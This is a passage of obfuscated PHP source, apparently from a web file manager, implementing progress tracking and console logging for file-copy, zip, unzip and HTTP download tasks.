if (substr($ˆ¾²Øàº, 0, strlen($‹Æ»Ù¸œ)) == $‹Æ»Ù¸œ) { return; } $ü æµş =& $this->task; $ü æµş[$êíŒÌë‰[1751]] = KodIO::transferType($ı¢ñˆãæ, $·Æ½¦î); $this->update(); } public function updateAfter() { $÷ÈÕ¬µÇ =& $_SERVER[ •ŒÓîÆ]; $‚”«ú‚ =& $this->task; if (!$‚”«ú‚[$÷ÈÕ¬µÇ[804]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($‚”«ú‚[$÷ÈÕ¬µÇ[1751]] == $÷ÈÕ¬µÇ[1356]) { return; } self::updateTask($‚”«ú‚); } private static function updateTask(&$ó¤ööùÄ) { $ÀâÚü÷ë =& $_SERVER[ •ŒÓîÆ]; if ($ó¤ööùÄ[$ÀâÚü÷ë[1751]] == $ÀâÚü÷ë[1235] || $ó¤ööùÄ[$ÀâÚü÷ë[1751]] == $ÀâÚü÷ë[109]) { if ($ó¤ööùÄ[$ÀâÚü÷ë[1745]]) { $ó¤ööùÄ[$ÀâÚü÷ë[1748]] = $ó¤ööùÄ[$ÀâÚü÷ë[1747]] + $ó¤ööùÄ[$ÀâÚü÷ë[1744]]; } } else { if ($ó¤ööùÄ[$ÀâÚü÷ë[1751]] == $ÀâÚü÷ë[1357]) { if ($ó¤ööùÄ[$ÀâÚü÷ë[1745]] == $ÀâÚü÷ë[1235]) { $ó¤ööùÄ[$ÀâÚü÷ë[1748]] = $ó¤ööùÄ[$ÀâÚü÷ë[1747]] + $ó¤ööùÄ[$ÀâÚü÷ë[1744]] * 0.5; } else { if ($ó¤ööùÄ[$ÀâÚü÷ë[1745]] == $ÀâÚü÷ë[109]) { $ó¤ööùÄ[$ÀâÚü÷ë[1748]] = $ó¤ööùÄ[$ÀâÚü÷ë[1747]] + $ó¤ööùÄ[$ÀâÚü÷ë[1743]] * 0.5 + $ó¤ööùÄ[$ÀâÚü÷ë[1744]] * 0.5; } } } } $ó¤ööùÄ[$ÀâÚü÷ë[1692]] = $ó¤ööùÄ[$ÀâÚü÷ë[1748]] / $ó¤ööùÄ[$ÀâÚü÷ë[804]]; if ($ó¤ööùÄ[$ÀâÚü÷ë[1692]] > 0) { $ÔÇØÆ¯“ = timeFloat() - $ó¤ööùÄ[$ÀâÚü÷ë[1694]] - $ó¤ööùÄ[$ÀâÚü÷ë[1697]]; $ó¤ööùÄ[$ÀâÚü÷ë[1698]] = $ÔÇØÆ¯“ * (1 - $ó¤ööùÄ[$ÀâÚü÷ë[1692]]) / $ó¤ööùÄ[$ÀâÚü÷ë[1692]]; } } public function addPath($÷¶ëõ÷‡) { $‡–Œ‰œà =& $_SERVER[ •ŒÓîÆ]; if (!$÷¶ëõ÷‡) { return; } $ı€ú‡æä =& $this->task; $ØÚ¯Ğ±ï = IO::infoWithChildren($÷¶ëõ÷‡); $Í·Üë³ê = $ı€ú‡æä[$‡–Œ‰œà[1752]] ? $ı€ú‡æä[$‡–Œ‰œà[1752]][$‡–Œ‰œà[1753]] : 0; $ı€ú‡æä[$‡–Œ‰œà[1752]] = array($‡–Œ‰œà[1753] => $Í·Üë³ê + 1, $‡–Œ‰œà[473] => $ØÚ¯Ğ±ï[$‡–Œ‰œà[32]], $‡–Œ‰œà[86] => $ØÚ¯Ğ±ï[$‡–Œ‰œà[86]], $‡–Œ‰œà[563] => $ØÚ¯Ğ±ï[$‡–Œ‰œà[563]] ? $ØÚ¯Ğ±ï[$‡–Œ‰œà[563]] : $ØÚ¯Ğ±ï[$‡–Œ‰œà[86]]); if ($ØÚ¯Ğ±ï[$‡–Œ‰œà[33]] == $‡–Œ‰œà[216]) { $ı€ú‡æä[$‡–Œ‰œà[827]] += 1; } else { $ı€ú‡æä[$‡–Œ‰œà[827]] += $ØÚ¯Ğ±ï[$‡–Œ‰œà[81]][$‡–Œ‰œà[79]]; if ($ØÚ¯Ğ±ï[$‡–Œ‰œà[183]]) { $ı€ú‡æä[$‡–Œ‰œà[827]] += $ØÚ¯Ğ±ï[$‡–Œ‰œà[81]][$‡–Œ‰œà[80]] + 1; } } $ı€ú‡æä[$‡–Œ‰œà[804]] += $ØÚ¯Ğ±ï[$‡–Œ‰œà[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ò€±¿»ê) { } public function sourceAddHashEnd($ÈÍÀ·–) { } public function sourceAddFileStart($±¦ÕÎî») { $åƒ™¤ =& $_SERVER[ •ŒÓîÆ]; $‹³ŠÊëÄ =& $this->task; $‹³ŠÊëÄ[$åƒ™¤[1743]] = $±¦ÕÎî»[$åƒ™¤[78]]; $‹³ŠÊëÄ[$åƒ™¤[1741]] = $±¦ÕÎî»[$åƒ™¤[32]]; $‹³ŠÊëÄ[$åƒ™¤[1105]] = $±¦ÕÎî»[$åƒ™¤[32]]; $‹³ŠÊëÄ[$åƒ™¤[1754]] = $±¦ÕÎî»[$åƒ™¤[86]]; $this->update(); } public function sourceAddFileEnd($â¼ì–ã) { $è“µÅ˜ =& $_SERVER[ •ŒÓîÆ]; $Ë˜Ëã’¦ =& $this->task; $Ë˜Ëã’¦[$è“µÅ˜[1748]] += $â¼ì–ã[$è“µÅ˜[78]]; $Ë˜Ëã’¦[$è“µÅ˜[1754]] = $â¼ì–ã[$è“µÅ˜[86]]; $this->update(1); } public function copyFileStart($‹ŠŸ£Ü„, $¹ÔÅÌüˆ, $ğ«Æ£Ë, $±ƒ±ùÕ®, $‡‹Äç™÷, $–•´íŠĞ) { $“çÃµ©° =& $_SERVER[ •ŒÓîÆ]; $ó‡æºâõ = $‡‹Äç™÷; if ($ó‡æºâõ == $GLOBALS[$“çÃµ©°[1755]]) { $ó‡æºâõ = $GLOBALS[$“çÃµ©°[1756]]; } $GLOBALS[$“çÃµ©°[1756]] = $‡‹Äç™÷; $GLOBALS[$“çÃµ©°[1755]] = $–•´íŠĞ; $²Ñ°«¸ =& $this->task; $²Ñ°«¸[$“çÃµ©°[1741]] = $ó‡æºâõ; $²Ñ°«¸[$“çÃµ©°[1743]] = (int) $‹ŠŸ£Ü„->size($¹ÔÅÌüˆ); $²Ñ°«¸[$“çÃµ©°[1744]] = 0; $²Ñ°«¸[$“çÃµ©°[1105]] = $“çÃµ©°[12]; $²Ñ°«¸[$“çÃµ©°[1745]] = $“çÃµ©°[12]; $²Ñ°«¸[$“çÃµ©°[1746]] = 0; $ÓˆË–Ÿ€ = $²Ñ°«¸[$“çÃµ©°[1743]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($²Ñ°«¸[$“çÃµ©°[453]] . $“çÃµ©°[1757]); if ($ÓˆË–Ÿ€ && file_exists(get_path_father($±ƒ±ùÕ®))) { Cache::set($²Ñ°«¸[$“çÃµ©°[453]] . $“çÃµ©°[1757], $±ƒ±ùÕ®); $²Ñ°«¸[$“çÃµ©°[1714]] = array($“çÃµ©°[1758], $“çÃµ©°[1759]); } $this->update(0, $ÓˆË–Ÿ€); } public static function updateCopyLocalFileSize($ëü¯ÓíŠ) { $ûêõù­õ =& $_SERVER[ •ŒÓîÆ]; $ÍÙ¢çŸì = Cache::get($ëü¯ÓíŠ[$ûêõù­õ[453]] . $ûêõù­õ[1757]); if (!$ÍÙ¢çŸì || !file_exists($ÍÙ¢çŸì)) { return $ëü¯ÓíŠ; } $ëü¯ÓíŠ[$ûêõù­õ[1744]] = @filesize($ÍÙ¢çŸì); $ëü¯ÓíŠ[$ûêõù­õ[1748]] += $ëü¯ÓíŠ[$ûêõù­õ[1744]]; self::updateTask($ëü¯ÓíŠ); return $ëü¯ÓíŠ; } public function copyFileEnd($´¤îÕƒÜ, $¹®Ş¦½ö, $²äñº´Š, $¢£±’¼, $ºò‡œİê, $¼£­İäÕ) { $Úà‚÷¤ =& $_SERVER[ •ŒÓîÆ]; $íªØ¬€ˆ =& $this->task; $íªØ¬€ˆ[$Úà‚÷¤[1744]] = $íªØ¬€ˆ[$Úà‚÷¤[1743]]; $íªØ¬€ˆ[$Úà‚÷¤[1745]] = $Úà‚÷¤[12]; unset($íªØ¬€ˆ[$Úà‚÷¤[1714]]); if ($ºò‡œİê == $íªØ¬€ˆ[$Úà‚÷¤[1741]]) { $íªØ¬€ˆ[$Úà‚÷¤[1747]] += $íªØ¬€ˆ[$Úà‚÷¤[1743]]; $íªØ¬€ˆ[$Úà‚÷¤[1748]] = $íªØ¬€ˆ[$Úà‚÷¤[1747]]; $™–è š¨ = 1; if (isset($íªØ¬€ˆ[$Úà‚÷¤[1754]]) && $íªØ¬€ˆ[$Úà‚÷¤[1754]] == $¹®Ş¦½ö) { $™–è š¨ = 0; } $this->update($™–è š¨); } else { $this->update(); $íªØ¬€ˆ[$Úà‚÷¤[1744]] = 0; } Cache::remove($íªØ¬€ˆ[$Úà‚÷¤[453]] . $Úà‚÷¤[1757]); self::log($Úà‚÷¤[1760] . $¹®Ş¦½ö . $Úà‚÷¤[72] . $¢£±’¼ . $Úà‚÷¤[248] . $ºò‡œİê . $Úà‚÷¤[1761] . $íªØ¬€ˆ[$Úà‚÷¤[1741]]); } public function updateFileEnd($Õä×ï…³, $‘¶²Ö) { $Œñ’°íˆ =& $_SERVER[ •ŒÓîÆ]; $Õ™Ô£ıä =& $this->task; $Õ™Ô£ıä[$Œñ’°íˆ[1741]] = $Õä×ï…³; $Õ™Ô£ıä[$Œñ’°íˆ[1743]] = $‘¶²Ö; $Õ™Ô£ıä[$Œñ’°íˆ[1747]] += $‘¶²Ö; $Õ™Ô£ıä[$Œñ’°íˆ[1748]] = $Õ™Ô£ıä[$Œñ’°íˆ[1747]]; $this->update(1); self::log($Œñ’°íˆ[1762] . $Õä×ï…³); } public function sourceModelCopy($äÁßï˜İ) { $èÏÊõ¤Ğ =& $_SERVER[ •ŒÓîÆ]; $ƒÖ´‡¼  = $äÁßï˜İ[0]; $²ÖÍ£åË = $äÁßï˜İ[1]; $è¶ÁÖÃ³ =& $this->task; $this->sourceModelCopyFlag = !0; $¿ˆç°­Å = 0; switch ($ƒÖ´‡¼ ) { case $èÏÊõ¤Ğ[615]: $¿ˆç°­Å = 1; break; case $èÏÊõ¤Ğ[618]: $è¶ÁÖÃ³[$èÏÊõ¤Ğ[1741]] = $²ÖÍ£åË[$èÏÊõ¤Ğ[32]]; break; case $èÏÊõ¤Ğ[620]: $¿ˆç°­Å = intval($äÁßï˜İ[$èÏÊõ¤Ğ[434]] * 0.4); break; case $èÏÊõ¤Ğ[622]: $¿ˆç°­Å = intval($äÁßï˜İ[$èÏÊõ¤Ğ[434]] * 0.2); break; case $èÏÊõ¤Ğ[624]: $¿ˆç°­Å = intval($äÁßï˜İ[$èÏÊõ¤Ğ[434]] * 0.4); break; } $this->update($¿ˆç°­Å); $this->sourceModelCopyFlag = !1; } public function sourceRemove($£‡æÔ, $¦íÕÁŒÓ) { $úĞüá¹× =& $_SERVER[ •ŒÓîÆ]; $this->sourceModelCopyFlag = !0; $ø—¸›Ñğ = 1; if (isset($£‡æÔ[$úĞüá¹×[81]])) { $ø—¸›Ñğ = $£‡æÔ[$úĞüá¹×[81]][$úĞüá¹×[79]]; $ø—¸›Ñğ = $ø—¸›Ñğ + $£‡æÔ[$úĞüá¹×[81]][$úĞüá¹×[80]] + 1; } $this->update($ø—¸›Ñğ); $this->sourceModelCopyFlag = !1; } public function sourceMove($õ¾ÚŞêÕ) { $this->sourceRemove($õ¾ÚŞêÕ, !1); } public function curlProgress($íß‹¦‘®, $ÀàôÔšØ, $û ÷¦çÇ, $øş“’ïğ, $â³±Ñıƒ) { $¶¤ˆ€Ï =& $_SERVER[ •ŒÓîÆ]; $ö…ßò²Ñ =& $this->task; if ($â³±Ñıƒ > 0) { $ö…ßò²Ñ[$¶¤ˆ€Ï[1105]] = $¶¤ˆ€Ï[1763]; $ö…ßò²Ñ[$¶¤ˆ€Ï[1745]] = $¶¤ˆ€Ï[109]; if ($ö…ßò²Ñ[$¶¤ˆ€Ï[1743]]) { $ö…ßò²Ñ[$¶¤ˆ€Ï[1744]] = $â³±Ñıƒ; } if ($ö…ßò²Ñ[$¶¤ˆ€Ï[1746]]) { $ö…ßò²Ñ[$¶¤ˆ€Ï[1744]] = $â³±Ñıƒ + $ö…ßò²Ñ[$¶¤ˆ€Ï[1746]]; } } else { if ($û ÷¦çÇ > 0) { if ($ö…ßò²Ñ[$¶¤ˆ€Ï[1743]] == $ÀàôÔšØ) { $ö…ßò²Ñ[$¶¤ˆ€Ï[1744]] = $û ÷¦çÇ; $ö…ßò²Ñ[$¶¤ˆ€Ï[1105]] = $¶¤ˆ€Ï[1764]; $ö…ßò²Ñ[$¶¤ˆ€Ï[1745]] = $¶¤ˆ€Ï[1235]; } } } $this->update(); } public function curlProgressStart($„‘³ç½Ş) { } public function curlProgressEnd($ÀªôØß) { $ı¨œªüİ =& $_SERVER[ •ŒÓîÆ]; $È½êŸµÚ =& $this->task; $¯ÈòïÜå = curl_getinfo($ÀªôØß); $¨‰û©ãÏ = $¯ÈòïÜå[$ı¨œªüİ[1765]]; if ($¨‰û©ãÏ == -1) { $¨‰û©ãÏ = $¯ÈòïÜå[$ı¨œªüİ[1766]]; } if ($È½êŸµÚ[$ı¨œªüİ[1745]] == $ı¨œªüİ[109] && $¨‰û©ãÏ) { $È½êŸµÚ[$ı¨œªüİ[1746]] += $¨‰û©ãÏ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $š¿É¶ =& $_SERVER[ •ŒÓîÆ]; $ª´²Áè =& $this->task; $ª´²Áè[$š¿É¶[1767]] = 1; Hook::bind($š¿É¶[1735], array($this, $š¿É¶[1768])); Hook::bind($š¿É¶[1737], array($this, $š¿É¶[1769])); Hook::bind($š¿É¶[1739], array($this, $š¿É¶[1770])); } protected function endAfter() { $¿ ­ŸÅ =& $_SERVER[ •ŒÓîÆ]; Hook::unbind($¿ ­ŸÅ[1735], array($this, $¿ ­ŸÅ[1768])); Hook::unbind($¿ ­ŸÅ[1737], array($this, $¿ ­ŸÅ[1769])); Hook::unbind($¿ ­ŸÅ[1739], array($this, $¿ ­ŸÅ[1770])); } public function progressStart($ŠÀÍæí¨) { $³ÄĞî—Ò =& $_SERVER[ •ŒÓîÆ]; $Œ‚áİ±Å = curl_getinfo($ŠÀÍæí¨); self::log($³ÄĞî—Ò[1771] . $Œ‚áİ±Å[$³ÄĞî—Ò[362]]); self::valueSet($this->task[$³ÄĞî—Ò[453]], $this->task); } public function progressEnd($ı‚²ÕÙå) { $ØŒ§²Š =& $_SERVER[ •ŒÓîÆ]; self::log($ØŒ§²Š[1772] . $this->task[$ØŒ§²Š[453]]); $this->end(); } public function progress($½àäËùà, $ˆÜÊ‹å€, $ÜÉí£´, $ªÏ‚, $ùãæÉ¬) { $²ãíïÛ =& $_SERVER[ •ŒÓîÆ]; $îáîàí =& $this->task; if ($ùãæÉ¬ > 0) { $îáîàí[$²ãíïÛ[827]] = $îáîàí[$²ãíïÛ[827]] == 0 ? $ªÏ‚ : $îáîàí[$²ãíïÛ[827]]; $îáîàí[$²ãíïÛ[1691]] = $ùãæÉ¬; } else { if ($ÜÉí£´ > 0) { $îáîàí[$²ãíïÛ[827]] = $îáîàí[$²ãíïÛ[827]] == 0 ? $ˆÜÊ‹å€ : $îáîàí[$²ãíïÛ[827]]; $îáîàí[$²ãíïÛ[1691]] = $ÜÉí£´; } } $this->update(); self::log("\x70\162\157\147\x72\x65\163\163\110\x74\164\x70\72\144\x6f\167\x6e\x3a{$ÜÉí£´}\x2f{$ˆÜÊ‹å€}\x3b\40\x75\x70\x6c\157\x61\144\72{$ùãæÉ¬}\x2f{$ªÏ‚}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Œ¼Ïá, $­°æ–Ú = '', $Ø„î±’ = 0, $‚êƒŞ™Ó = '') { $İ¬à§Ã¶ =& $_SERVER[ •ŒÓîÆ]; $‡Œé½Ì› = new Task($Œ¼Ïá, $­°æ–Ú, $Ø„î±’, $‚êƒŞ™Ó); $GLOBALS[$İ¬à§Ã¶[1773] . $Œ¼Ïá] = new TaskLog($İ¬à§Ã¶[1674], $‡Œé½Ì›, $‚êƒŞ™Ó); return $‡Œé½Ì›; } public function __construct($±÷¸›ŠÎ = '', $šˆûİàØ = '', $§Ú­ÓÇ¶ = '') { $Ãª°á¶¤ =& $_SERVER[ •ŒÓîÆ]; if (!$±÷¸›ŠÎ) { $±÷¸›ŠÎ = $Ãª°á¶¤[1674]; } $²ıœöå = $±÷¸›ŠÎ . $Ãª°á¶¤[440] . rand_string(10); if (!$§Ú­ÓÇ¶) { $§Ú­ÓÇ¶ = $±÷¸›ŠÎ . $Ãª°á¶¤[53] . $§Ú­ÓÇ¶; } switch ($±÷¸›ŠÎ) { case $Ãª°á¶¤[1674]: if (!$šˆûİàØ || !$šˆûİàØ->task) { return echoLog($±÷¸›ŠÎ . $Ãª°á¶¤[1774]); } $ò»µÍô = $šˆûİàØ; $²ıœöå = $ò»µÍô->task[$Ãª°á¶¤[453]]; $±÷¸›ŠÎ = $ò»µÍô->task[$Ãª°á¶¤[453]]; if (!$ò»µÍô->task[$Ãª°á¶¤[1585]]) { $ò»µÍô->task[$Ãª°á¶¤[1585]] = $§Ú­ÓÇ¶ ? $§Ú­ÓÇ¶ : $±÷¸›ŠÎ; } break; case $Ãª°á¶¤[1775]: if (!$šˆûİàØ) { return echoLog($±÷¸›ŠÎ . $Ãª°á¶¤[1776]); } $­Ïç¸šâ = is_string($šˆûİàØ) ? array($šˆûİàØ) : $šˆûİàØ; $ò»µÍô = new TaskFileTransfer($²ıœöå, $±÷¸›ŠÎ, 0, $§Ú­ÓÇ¶ ? $§Ú­ÓÇ¶ : $­Ïç¸šâ[0]); foreach ($­Ïç¸šâ as $ÆúÔ„¿¸) { $ò»µÍô->addPath($ÆúÔ„¿¸); } break; case $Ãª°á¶¤[368]: if (!$šˆûİàØ) { return echoLog($±÷¸›ŠÎ . $Ãª°á¶¤[1776]); } $­Ïç¸šâ = is_string($šˆûİàØ) ? array($šˆûİàØ) : $šˆûİàØ; $ò»µÍô = new TaskZip($²ıœöå, $±÷¸›ŠÎ, 0, $§Ú­ÓÇ¶ ? $§Ú­ÓÇ¶ : $­Ïç¸šâ[0]); foreach ($­Ïç¸šâ as $ÆúÔ„¿¸) { $ò»µÍô->addPath($ÆúÔ„¿¸); } break; case $Ãª°á¶¤[1255]: if (!$šˆûİàØ) { return echoLog($±÷¸›ŠÎ . $Ãª°á¶¤[1776]); } $ò»µÍô = new TaskUnZip($²ıœöå, $±÷¸›ŠÎ, 0, $§Ú­ÓÇ¶ ? $§Ú­ÓÇ¶ : $šˆûİàØ); if ($šˆûİàØ) { $ò»µÍô->addFile($šˆûİàØ); } break; case $Ãª°á¶¤[151]: $ò»µÍô = new TaskHttp($²ıœöå, $±÷¸›ŠÎ); break; default: return; break; } $this->task = $ò»µÍô; $this->taskID = $²ıœöå; Hook::bind($Ãª°á¶¤[1711], array($this, $Ãª°á¶¤[1777])); Hook::bind($Ãª°á¶¤[1713], array($this, $Ãª°á¶¤[1778])); Hook::bind($Ãª°á¶¤[1707], array($this, $Ãª°á¶¤[1779])); echoLog($Ãª°á¶¤[1780] . $ò»µÍô->task[$Ãª°á¶¤[1585]]); } public function __destruct() { $this->end(); } public function end($”Ø­üÍŞ = '') { $—ÎÂ”ûœ =& $_SERVER[ •ŒÓîÆ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($”Ø­üÍŞ); $this->task = !1; $this->taskID = !1; Hook::unbind($—ÎÂ”ûœ[1711], array($this, $—ÎÂ”ûœ[1777])); Hook::unbind($—ÎÂ”ûœ[1713], array($this, $—ÎÂ”ûœ[1778])); Hook::unbind($—ÎÂ”ûœ[1707], array($this, $—ÎÂ”ûœ[1779])); } public function taskUpdate($”£š±‡) { $å“Ëó =& $_SERVER[ •ŒÓîÆ]; if (!$”£š±‡ || $this->taskID != $”£š±‡[$å“Ëó[453]]) { return; } $‡õÎ¤éË = 20; $ÕåÆğ‚ = intval($”£š±‡[$å“Ëó[1692]] * $‡õÎ¤éË); $Àë€ÆÒä = $å“Ëó[165] . str_repeat($å“Ëó[925], $ÕåÆğ‚) . $å“Ëó[1055] . str_repeat($å“Ëó[53], $‡õÎ¤éË - $ÕåÆğ‚) . $å“Ëó[167]; $Á‹£ØáÚ = $Àë€ÆÒä . sprintf($å“Ëó[1781], $”£š±‡[$å“Ëó[1692]] * 100) . $å“Ëó[1782]; $÷Ê¶õŞğ = $Á‹£ØáÚ . $”£š±‡[$å“Ëó[1691]] . $å“Ëó[8] . $”£š±‡[$å“Ëó[827]] . LNG($å“Ëó[1783]); $®³Ğõ±° = $å“Ëó[12]; if ($”£š±‡[$å“Ëó[1767]]) { $÷Ê¶õŞğ = $Á‹£ØáÚ . size_format($”£š±‡[$å“Ëó[1691]]) . $å“Ëó[8] . size_format($”£š±‡[$å“Ëó[827]]); $®³Ğõ±° = size_format($”£š±‡[$å“Ëó[1693]]) . $å“Ëó[1784]; } if ($”£š±‡[$å“Ëó[1105]]) { $”£š±‡[$å“Ëó[1741]] = $”£š±‡[$å“Ëó[1105]] . $å“Ëó[53] . $”£š±‡[$å“Ëó[1741]]; } if ($”£š±‡[$å“Ëó[1741]]) { $¬‚¥Š‡Ä = $å“Ëó[12]; if ($”£š±‡[$å“Ëó[1743]]) { $¬‚¥Š‡Ä = $å“Ëó[50] . size_format($”£š±‡[$å“Ëó[1744]]) . $å“Ëó[8] . size_format($”£š±‡[$å“Ëó[1743]]); } $®³Ğõ±° .= $”£š±‡[$å“Ëó[1741]] . $¬‚¥Š‡Ä; } if ($”£š±‡[$å“Ëó[804]] && !$”£š±‡[$å“Ëó[1743]]) { $®³Ğõ±° .= $å“Ëó[53] . size_format($”£š±‡[$å“Ëó[1748]]) . $å“Ëó[8] . size_format($”£š±‡[$å“Ëó[804]]); } echoLog($÷Ê¶õŞğ . $å“Ëó[53] . $®³Ğõ±°, !0); } public function taskEnd($ä– ) { $ÒÌæ·Ï =& $_SERVER[ •ŒÓîÆ]; if (!$ä–  || $this->taskID != $ä– [$ÒÌæ·Ï[453]]) { return; } $ÚŸŒ€Àæ = $ä–  ? $ä– [$ÒÌæ·Ï[1691]] . $ÒÌæ·Ï[8] . $ä– [$ÒÌæ·Ï[827]] . LNG($ÒÌæ·Ï[1783]) . $ÒÌæ·Ï[73] : $ÒÌæ·Ï[12]; echoLog($ÒÌæ·Ï[1785] . $ä– [$ÒÌæ·Ï[1585]] . ($ä– [$ÒÌæ·Ï[505]] ? $ÒÌæ·Ï[73] . $ä– [$ÒÌæ·Ï[505]] : $ÒÌæ·Ï[12]) . $ÒÌæ·Ï[73] . $ÚŸŒ€Àæ . $ÒÌæ·Ï[1786] . sprintf($ÒÌæ·Ï[892], timeFloat() - $ä– [$ÒÌæ·Ï[1694]]) . $ÒÌæ·Ï[1706]); $this->end(); } public function taskKill($¯€‹½ŞÌ) { $’€ÇÄ =& $_SERVER[ •ŒÓîÆ]; if (!$¯€‹½ŞÌ || $this->taskID != $¯€‹½ŞÌ[$’€ÇÄ[453]]) { return; } echoLog($’€ÇÄ[1787] . $¯€‹½ŞÌ[$’€ÇÄ[1585]]); } } goto c„«›œ›À£; AÊÌª±íòÂ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ûš‹Î’Í =& $_SERVER[ •ŒÓîÆ]; parent::startAfter(); Hook::bind($ûš‹Î’Í[1814], array($this, $ûš‹Î’Í[1804])); Hook::bind($ûš‹Î’Í[1806], array($this, $ûš‹Î’Í[1807])); $¡œ’ºü« =& $this->task; $¡œ’ºü«[$ûš‹Î’Í[1808]] = $ûš‹Î’Í[1235]; if (!$¡œ’ºü«[$ûš‹Î’Í[1585]]) { $¡œ’ºü«[$ûš‹Î’Í[1585]] = LNG($ûš‹Î’Í[1815]); } } protected function endAfter() { $ã€ç¬‘ş =& $_SERVER[ •ŒÓîÆ]; parent::endAfter(); Hook::unbind($ã€ç¬‘ş[1814], array($this, $ã€ç¬‘ş[1804])); Hook::unbind($ã€ç¬‘ş[1806], array($this, $ã€ç¬‘ş[1807])); } public function updateAfter() { $Üáó†€œ =& $_SERVER[ •ŒÓîÆ]; $Ë†×¤­è =& $this->task; if (!$Ë†×¤­è[$Üáó†€œ[827]] || !$Ë†×¤­è[$Üáó†€œ[804]]) { return; } if ($Ë†×¤­è[$Üáó†€œ[1808]] == $Üáó†€œ[1235]) { $Éµş­¦ë = $Ë†×¤­è[$Üáó†€œ[1744]]; if ($Ë†×¤­è[$Üáó†€œ[1745]] != $Üáó†€œ[1235]) { $Éµş­¦ë = 0; } $‰õ„¸ğÎ = ($Ë†×¤­è[$Üáó†€œ[1748]] + $Éµş­¦ë) / $Ë†×¤­è[$Üáó†€œ[804]]; $Ë†×¤­è[$Üáó†€œ[1692]] = $‰õ„¸ğÎ * 0.3; } else { if ($Ë†×¤­è[$Üáó†€œ[1808]] == $Üáó†€œ[368]) { $‰õ„¸ğÎ = $Ë†×¤­è[$Üáó†€œ[1691]] / $Ë†×¤­è[$Üáó†€œ[827]]; $Ë†×¤­è[$Üáó†€œ[1692]] = 0.3 + $‰õ„¸ğÎ * 0.5; } else { if ($Ë†×¤­è[$Üáó†€œ[1808]] == $Üáó†€œ[109]) { $‰õ„¸ğÎ = 0; if ($Ë†×¤­è[$Üáó†€œ[1743]]) { $‰õ„¸ğÎ = $Ë†×¤­è[$Üáó†€œ[1744]] / $Ë†×¤­è[$Üáó†€œ[1743]]; } $Ë†×¤­è[$Üáó†€œ[1692]] = 0.3 + 0.5 + $‰õ„¸ğÎ * 0.2; } } } if ($Ë†×¤­è[$Üáó†€œ[1692]] > 0) { $£œ´Û¨í = timeFloat() - $Ë†×¤­è[$Üáó†€œ[1694]] - $Ë†×¤­è[$Üáó†€œ[1697]]; $Ë†×¤­è[$Üáó†€œ[1698]] = $£œ´Û¨í * (1 - $Ë†×¤­è[$Üáó†€œ[1692]]) / $Ë†×¤­è[$Üáó†€œ[1692]]; } } public function copyFileStart($ÛŸŒ‹ôù, $ğŒ¡ÆûÔ, $æºÃš¦«, $°ô§üäŒ, $Ç¡±¹, $©”²µ·Ö) { $•õ…¤¶ =& $_SERVER[ •ŒÓîÆ]; parent::copyFileStart($ÛŸŒ‹ôù, $ğŒ¡ÆûÔ, $æºÃš¦«, $°ô§üäŒ, $Ç¡±¹, $©”²µ·Ö); $Úı’€ª¸ =& $this->task; if ($Úı’€ª¸[$•õ…¤¶[1808]] == $•õ…¤¶[368]) { $Úı’€ª¸[$•õ…¤¶[1808]] = $•õ…¤¶[109]; } $this->update(); } public function copyFileEnd($Á¬—Ê‘¾, $–¹ÅÎÜË, $ÑÑ–«ñß, $†ô§å˜, $Û›Å¬±³, $ƒ·³’»Ã) { $ËÌ‹ËĞç =& $_SERVER[ •ŒÓîÆ]; $€É‚îŸİ =& $this->task; $€É‚îŸİ[$ËÌ‹ËĞç[1744]] = $€É‚îŸİ[$ËÌ‹ËĞç[1743]]; $€É‚îŸİ[$ËÌ‹ËĞç[1748]] += $€É‚îŸİ[$ËÌ‹ËĞç[1743]]; $€É‚îŸİ[$ËÌ‹ËĞç[1745]] = $ËÌ‹ËĞç[12]; $this->update(); } public function zipEvent($Üì´¡‹÷, $“¤•°³, $–¦èË¼¯, $‘û”¸½û) { $ÏšŒïı³ =& $_SERVER[ •ŒÓîÆ]; $û™ÉÜ¹ñ =& $this->task; $û™ÉÜ¹ñ[$ÏšŒïı³[1741]] = get_path_this($“¤•°³); $û™ÉÜ¹ñ[$ÏšŒïı³[1743]] = $‘û”¸½û; $û™ÉÜ¹ñ[$ÏšŒïı³[1744]] = $–¦èË¼¯; $û™ÉÜ¹ñ[$ÏšŒïı³[1105]] = $Üì´¡‹÷ == $ÏšŒïı³[1816] ? $ÏšŒïı³[1811] : $ÏšŒïı³[1812]; $û™ÉÜ¹ñ[$ÏšŒïı³[1745]] = $ÏšŒïı³[12]; $û™ÉÜ¹ñ[$ÏšŒïı³[804]] = $‘û”¸½û; $û™ÉÜ¹ñ[$ÏšŒïı³[1808]] = $ÏšŒïı³[368]; $this->update(); } public function nameParse($³¶ÌºªÕ) { $öä¬ÆŠ” =& $_SERVER[ •ŒÓîÆ]; $ëŠ×ñÃí =& $this->task; if ($ëŠ×ñÃí[$öä¬ÆŠ”[1691]] < $ëŠ×ñÃí[$öä¬ÆŠ”[827]]) { $Ñó…¡Ğ’ = get_path_this($³¶ÌºªÕ); if (strstr($Ñó…¡Ğ’, $öä¬ÆŠ”[10])) { $ëŠ×ñÃí[$öä¬ÆŠ”[1691]] += 1; } } if ($ëŠ×ñÃí[$öä¬ÆŠ”[1808]] == $öä¬ÆŠ”[1235]) { $ëŠ×ñÃí[$öä¬ÆŠ”[1808]] = $öä¬ÆŠ”[368]; } $ëŠ×ñÃí[$öä¬ÆŠ”[1741]] = $³¶ÌºªÕ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($º‘ÌÎ“‰) { $óµÈœã­ =& $_SERVER[ •ŒÓîÆ]; $–Óš“·Ô = array($óµÈœã­[642] => array($óµÈœã­[33] => $óµÈœã­[1817], $óµÈœã­[328] => array($óµÈœã­[241], $óµÈœã­[806], $óµÈœã­[1818], $óµÈœã­[1819])), $óµÈœã­[1820] => array($óµÈœã­[33] => $óµÈœã­[1821], $óµÈœã­[328] => array($óµÈœã­[241], $óµÈœã­[804], $óµÈœã­[1822], $óµÈœã­[1823], $óµÈœã­[1824]))); if (!isset($–Óš“·Ô[$º‘ÌÎ“‰])) { return !1; } $this->optionType = $–Óš“·Ô[$º‘ÌÎ“‰][$óµÈœã­[33]]; 